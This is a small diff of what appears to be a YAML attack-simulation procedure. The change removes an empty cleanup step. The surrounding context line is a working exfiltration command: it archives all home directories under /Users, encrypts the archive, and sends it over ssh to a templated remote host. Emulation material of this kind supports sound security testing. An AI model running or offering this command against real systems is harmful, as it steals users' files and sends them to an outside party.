@@ -31,6 +31,3 @@ steps:
       inline: |
         tar czpf - /Users/* | openssl des3 -salt -pass {{.Args.password}} | ssh {{.Args.user_name}}@{{.Args.domain}} 'cat > /Users.tar.gz.enc'
       executor: sh
-      cleanup:
-        inline: ""
-        executor: sh
